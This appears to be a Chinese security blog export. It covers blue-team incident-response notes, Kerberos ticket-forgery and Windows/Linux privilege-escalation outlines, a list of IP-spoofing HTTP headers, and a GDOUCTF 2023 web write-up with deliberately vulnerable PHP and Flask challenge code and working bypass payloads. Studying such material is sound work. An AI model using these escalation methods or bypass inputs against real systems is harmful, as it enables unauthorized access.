<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="应急响应基本流程"><a href="#应急响应基本流程" class="headerlink" title="应急响应基本流程"></a>应急响应基本流程</h3><p>1.首先应该是<strong>信息收集</strong>，比如说影响范围有多大，事件类型是什么，源头主机和攻击意图，是否需要保障业务等等信息，这一步可以帮助我们更有效的进行下一步的阻断攻击行为。</p>
<p>2.接下来就是<strong>结合已知的信息阻断攻击行为，保护资产</strong>。比如说攻击行为局限于某个站点，且未造成较大损失，那我们可以直接封掉攻击者的IP来确保业务的正常进行，当然之后也要对这个站点有一个持续的关注。如果是某台主机沦陷或者说域控服务器沦陷，那么这就算比较重大的损失，为了避免损失扩大，应该及时将感染设备断网处理。如果有备份服务器，可以切换备用设备来保障业务正常。</p>
<p>3.<strong>对攻击行为阻断后需要对数据进行保护</strong>，比如说保存好流量、可疑进程的内存、失陷系统镜像、恶意样本、设备的日志，这一步可以有效帮助我们后续的溯源工作。</p>
<p>4.<strong>安全事件影响根除</strong>，工具结合手工从系统用户是否有新增用户，进程信息，计划任务，自启动项，注册表，端口状态(是否有对外连接)等方面来检查是否有可疑行为，比如说火绒剑，ProcessHacker等专门用于分析这些方面的工具。如果有就直接关闭或者删除，有一些顽固进程或者顽固文件无法关闭或者删除可以结合专杀工具处理，比如说Rkhunter,火绒等工具。</p>
<p>5.<strong>恢复业务</strong>，加强安全措施，加固系统等，比如说更新软件版本，安装已知漏洞的补丁，关闭某些端口等等，暂时没有解决办法的可以根据业务需求关闭某些服务。<br>6.最后就是输出报告，总结反思。</p>
<h3 id="应急响应案例"><a href="#应急响应案例" class="headerlink" title="应急响应案例"></a>应急响应案例</h3><p>我拿个之前的应急排查来说吧，就是我们这边接到通知他们公司几台服务器有问题，让我们去检测。然后看到是windows的机子，本地用户和组排查的时候发现新建可疑的用户，确定主机是有问题的，对方已经拿到主机权限,然后事件管理器有大量的登录日志爆破，采取的措施是直接删除可疑的和隐藏账号,排查登录日志,确定系统账号已经不安全,更新了管理员账号,对启动项和可疑进程做了清除,取了一份样本拿去分析,通告上级紧急修补web站点的漏洞.</p>
<h3 id="内网隧道："><a href="#内网隧道：" class="headerlink" title="内网隧道："></a>内网隧道：</h3><p>tcp隧道：基础的 TCP 映射，适用于大多数服务，例如<strong>远程桌面、SSH</strong></p>
<p>udp隧道：基础的 UDP 映射，适用于域名解析、部分基于 UDP 协议的<strong>游戏</strong></p>
<p>http：搭建网站专用映射，通过 80 端口访问</p>
<p>https：带有 SSL 加密的网站映射，通过 443 端口访问，映射目标需要支持 SSL</p>
<h3 id="护网时对IP的判断"><a href="#护网时对IP的判断" class="headerlink" title="护网时对IP的判断"></a>护网时对IP的判断</h3><p>如果该IP在护网期间频繁出现，而护网之前基本上未出现过，那么改IP很有可能是红队IP。即封锁该IP。</p>
<p>护网中封锁红队IP的方法有以下几种：</p>
<ol>
<li><p>使用防火墙（<strong>WAF</strong>）：防火墙可以设置规则，将红队IP加入黑名单，从而禁止它们访问受保护的网络或系统。</p>
</li>
<li><p>使用入侵检测系统（<strong>IDS</strong>）：入侵检测系统可以监测网络流量和系统行为，当检测到红队IP的攻击行为时，可以自动将其加入黑名单或者阻止其访问。</p>
</li>
<li><p>使用反向代理（常见的有CF）：在反向代理服务器上设置规则，当检测到红队IP的攻击行为时，可以将其请求重定向到一个错误页面或者进行拦截。</p>
</li>
<li><h5 id="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"><a href="#使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。" class="headerlink" title="使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。"></a>使用IP过滤器：可以使用专门的IP过滤器，将红队IP加入黑名单中，从而禁止其访问受保护的网络或系统。</h5></li>
</ol>
<h2 id="敏感事件id"><a href="#敏感事件id" class="headerlink" title="敏感事件id:"></a>敏感事件id:</h2><p>4624 登录成功<br>4625 登录失败<br>4634 注销成功<br>4647 用户启动的注销<br>4672 使用超级用户&#x2F;管理员用户进行登录<br>4720 创建用户</p>
<h2 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h2><p>挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p>
<p>攻击者通过各种手段将挖矿程序植入受害者的计算机中，在受害者不知情的情况下利用其计算机的云算力进行挖矿，从而获取利益，这类非法植入用户计算机的挖矿程序就是挖矿木马。</p>
<h2 id="蠕虫感染"><a href="#蠕虫感染" class="headerlink" title="蠕虫感染"></a>蠕虫感染</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>蠕虫病毒的程序结构通常包括三个模块： [3] </p>
<p>(1)传播模块：负责蠕虫的传播，它可以分为扫描模块、攻击模块和复制模块三个子模块。其中，扫描模块负责探测存在漏洞的主机；攻击模块按漏洞攻击步骤自动攻击找到的对象；复制模块通过原主机和新主机交互将蠕虫程序复制到新主机并启动。 [3] </p>
<p>(2)隐藏模块：侵入主机后，负责隐藏蠕虫程序。 [3] </p>
<p>(3)目的功能模块：实现对计算机的控制、监视或破坏等。 [3] </p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>根据蠕虫病毒的程序其工作流程可以分为漏洞扫描、攻击、传染、现场处理四个阶段，首先蠕虫程序随机(或在某种倾向性策略下)选取某一段IP地址，接着对这一地址段的主机扫描，当扫描到有漏洞的计算机系统后，将蠕虫主体迁移到目标主机。然后，蠕虫程序进入被感染的系统，对目标主机进行现场处理。同时，蠕虫程序生成多个副本，重复上述流程。各个步骤的繁简程度也不同，有的十分复杂，有的则非常简单。</p>
<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><p>勒索病毒：能对用户文件进行加密的病毒。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p>
<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</p>
<h2 id="内网黄金票据原理"><a href="#内网黄金票据原理" class="headerlink" title="内网黄金票据原理"></a>内网黄金票据原理</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br>Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<h2 id="黄金票据和白银票据的区别？"><a href="#黄金票据和白银票据的区别？" class="headerlink" title="黄金票据和白银票据的区别？"></a>黄金票据和白银票据的区别？</h2><p><strong>获取的权限不同</strong><br>金票:伪造的TGT，可以获取任意Kerberos的访问权限</p>
<p>银票:伪造的ST，只能访问指定的服务，如CIFS<br><strong>认证流程不同</strong><br>金票: 同KDC交互，但不同AS交互<br>银票:不同KDC交互，直接访问Server<br><strong>加密方式不同</strong><br>金票: 由krbtgt NTLM Hash 加密<br>银票: 由服务账号 NTLM Hash 加密</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h3><p>1.通过 su 命令暴破 root 密码</p>
<p>2.内核漏洞提权</p>
<p>3.SUID提权：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限</p>
<p>4.find：find实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</p>
<h3 id="window提权"><a href="#window提权" class="headerlink" title="window提权"></a>window提权</h3><p><strong>1、系统内核溢出漏洞提权</strong></p>
<p><strong>#手工查找补丁情况</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #查看补丁
wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>#MSF后渗透扫描</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2、at命令利用</strong></p>
<p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将权限提升至system权限。</strong></p>
<p><strong>3.数据库提权</strong></p>
<pre class="line-numbers language-none"><code class="language-none">udf提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。
mof提权：在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>4.MS14-068 域用户提权漏洞</strong></p>
<p>服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020">域控</a>dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。</p>
<h2 id="主机加固"><a href="#主机加固" class="headerlink" title="主机加固"></a>主机加固</h2><h3 id="Linux加固"><a href="#Linux加固" class="headerlink" title="Linux加固"></a>Linux加固</h3><p>**1.**修改ssh的配置文件，禁止root直接登录</p>
<p>**2.**修改密码策略配置文件，确保密码最小长度为8位</p>
<p>**3.**确保错误登录3次，锁定此账户5分钟</p>
<p>**4.**禁止su非法提权，只允许root和wheel组用户su到root</p>
<p>**5.**不响应ICMP请求</p>
<p>**6.**设置登陆超时时间为10分钟</p>
<p><strong>7.</strong> 结束非法登录用户</p>
<h3 id="Windows加固"><a href="#Windows加固" class="headerlink" title="Windows加固"></a><strong>Windows加固</strong></h3><p><strong>1.</strong>  <strong>修改3389端口</strong></p>
<p><strong>2.</strong>  设置安全策略，不允许<strong>SAM</strong>帐户的匿名枚举，不允许SAM帐户和共享的匿名枚举</p>
<p><strong>3.<strong>在组策略中设置</strong>阻止访问注册表编辑工具</strong></p>
<p><strong>4.</strong>  <strong>开启审核对象访问，成功与失败；开启审核目录服务访问，成功与失败；开启审核系统事件，成功与失败</strong></p>
<p><strong>5.</strong>  <strong>禁止445端口漏洞</strong></p>
<p><strong>6.</strong>  <strong>设置屏幕保护在恢复时使用密码保护</strong></p>
<p><strong>7.</strong>  <strong>设置windows密码策略</strong>：使密码必须满足复杂性，设置密码长度最小值为8位，设置密码最长存留期为30天</p>
<p><strong>8.</strong>  开启Windows防火墙，<strong>关闭ping服务</strong>，打开3389、80等服务</p>
<p><strong>9.</strong>  <strong>关闭系统默认共享</strong></p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>分析方法：</p>
<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>b、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开事件查看器。</p>
<p>c、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p>
<h3 id="2-web访问日志"><a href="#2-web访问日志" class="headerlink" title="2.web访问日志"></a>2.web访问日志</h3><p>分析方法：</p>
<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
<p>b、推荐工具：</p>
<ul>
<li>Windows下，推荐使用EmEditor进行日志分析，支持大文本，搜索效率不错。</li>
<li>Linux下，使用Shell命名组合查询分析。</li>
</ul>
<h2 id="正向shell和反向shell"><a href="#正向shell和反向shell" class="headerlink" title="正向shell和反向shell"></a><strong>正向shell和反向shell</strong></h2><p> 正向shell：控制端主动发起连接去连接被控制端<br> 反向shell：被控制端主动连接控制端</p>
<h2 id="防火墙中的DMZ区域，Trust区域，Untrust区域"><a href="#防火墙中的DMZ区域，Trust区域，Untrust区域" class="headerlink" title="防火墙中的DMZ区域，Trust区域，Untrust区域"></a>防火墙中的DMZ区域，Trust区域，Untrust区域</h2><h3 id="DMZ区域（非军事化区）"><a href="#DMZ区域（非军事化区）" class="headerlink" title="DMZ区域（非军事化区）"></a>DMZ区域（非军事化区）</h3><p> 1.两个防火墙之间的空间被称为DMZ。与Internet相比，DMZ可以提供更高的安全性，但是其安全性比内部网络低。<br> 2.服务器 内 外网都可以访问,但还是与内网隔离.<br> 就算是黑客把DMZ服务器拿下,也不能使用服务器来控制内网的网络.起到安全的策略<br>Trust区域，</p>
<h3 id="Trust区域（受信区）"><a href="#Trust区域（受信区）" class="headerlink" title="Trust区域（受信区）"></a>Trust区域（受信区）</h3><p> 可信任的接口.是局域网的接口.此接口外网和DMZ无法访问.<br> 外部不能访问trust口<br> DMZ不能访问trust口</p>
<h3 id="Untrust区域（非受信区）"><a href="#Untrust区域（非受信区）" class="headerlink" title="Untrust区域（非受信区）"></a>Untrust区域（非受信区）</h3><p> 不信任的接口,是用来接internet的,这个接口的信息内网不接受<br> 可以通过untrust口访问DMZ,但不能访问trust口**</p>
]]></content>
      <categories>
        <category>hvv</category>
      </categories>
  </entry>
  <entry>
    <title>CTF 用于伪造ip的http请求头</title>
    <url>/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For:"></a>X-Forwarded-For:</h3><p>该字段包含客户端通过代理服务器转发的IP地址，这通常用于验证客户端是否通过代理服务器进行通信。</p>
<h3 id="Client-ip"><a href="#Client-ip" class="headerlink" title="Client-ip:"></a>Client-ip:</h3><p>该字段包含客户端的IP地址，用于验证客户端是否与服务器在同一网络中。</p>
<h3 id="X-Client-IP"><a href="#X-Client-IP" class="headerlink" title="X-Client-IP:"></a>X-Client-IP:</h3><p>该字段包含客户端的IP地址，用于验证客户端是否与服务器在同一网络中。</p>
<h3 id="X-Remote-IP"><a href="#X-Remote-IP" class="headerlink" title="X-Remote-IP:"></a>X-Remote-IP:</h3><p>该字段包含服务器返回给客户端的IP地址，用于验证服务器是否与客户端在同一网络中。</p>
<h3 id="X-Rriginating-IP"><a href="#X-Rriginating-IP" class="headerlink" title="X-Rriginating-IP:"></a>X-Rriginating-IP:</h3><p>该字段包含服务器缓存中保存的IP地址，用于验证服务器是否在本地缓存中保存了客户端的IP地址。</p>
<h3 id="X-Remote-addr"><a href="#X-Remote-addr" class="headerlink" title="X-Remote-addr:"></a>X-Remote-addr:</h3><p>该字段包含服务器返回给客户端的IP地址，用于验证服务器是否与客户端在同一网络中。</p>
<h3 id="HTTP-CLIENT-IP"><a href="#HTTP-CLIENT-IP" class="headerlink" title="HTTP_CLIENT_IP:"></a>HTTP_CLIENT_IP:</h3><p>该字段包含客户端发送HTTP请求时使用的IP地址，用于验证HTTP请求是否来自同一客户端。</p>
<h3 id="X-Real-IP"><a href="#X-Real-IP" class="headerlink" title="X-Real-IP:"></a>X-Real-IP:</h3><p>该字段包含客户端的真实IP地址，用于验证客户端是否与服务器在同一网络中。</p>
<h3 id="X-Originating-IP"><a href="#X-Originating-IP" class="headerlink" title="X-Originating-IP:"></a>X-Originating-IP:</h3><p>该字段包含服务器返回给客户端的IP地址，用于验证服务器是否发起了该HTTP请求，该地址应与HTTP响应相匹配。</p>
<h3 id="via"><a href="#via" class="headerlink" title="via:"></a>via:</h3><p>该字段包含通过代理服务器转发的 IP 地址，这通常用于验证客户端是否通过代理服务器进行通信。</p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>GDOUCTF 2023</title>
    <url>/2023/04/17/GDOUCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h3><p><strong>JS</strong><br><img src="https://img-blog.csdnimg.cn/83a1d5e00991490b8df76fbf9ff9b211.png" alt="1"><br>像遇到游戏题目常规思路就是F12改数据或者调试，本题也一样。由于本题游戏过程中速度会越来越快，在js代码中寻找speed的逻辑。<br><img src="https://img-blog.csdnimg.cn/17ccc8f0652c48a4936ccf77acc9ec2a.png" alt="2"><br>调试一下改为**this.speed;**然后然他运行一段时间就得到flag。<br><img src="https://img-blog.csdnimg.cn/17dfe7a150b248e5bae600152eb3f4be.png" alt="2"></p>
<h3 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h3><p><strong>审计代码</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>
                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
                   <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"洗洗睡吧"</span><span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"行不行啊细狗"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'菜菜'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"就这?"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"别来沾边"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>层层绕过。<br>GET<br><code>?aaa=114514a&amp;bbb=114514b&amp;a=flag&amp;flag=a</code><br>POST<br><code>gdou[]=1&amp;ctf[]=2</code><br>COOKIE<br><code>cookie=j0k3r</code><br><img src="https://img-blog.csdnimg.cn/4a2c6f2e48e24be696a551a8aa9ca7fc.png" alt="3"></p>
<h3 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h3><p><strong>源码泄露</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/a8e1c77c98894795bc9d1f5ebfbc0d8e.png" alt="3"><br>访问&#x2F;src下载源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> flask

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问<code>/super-secret-route-nobody-will-guess</code>burp抓包GET改为PUT得到flag。<br><img src="https://img-blog.csdnimg.cn/f428cefb45aa4c01abc3e53ba9b68ffc.png" alt="5"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h3><p><strong>python框架jinja2 SSTI漏洞</strong><br>有学习价值。<br><img src="https://img-blog.csdnimg.cn/0c4046d1d8424ffba759b0ee71cfc198.png" alt="6"></p>
<p><code>报错出框架，使用&#123;&#123;&#125;&#125;不行，看来过滤了很多东西。</code></p>
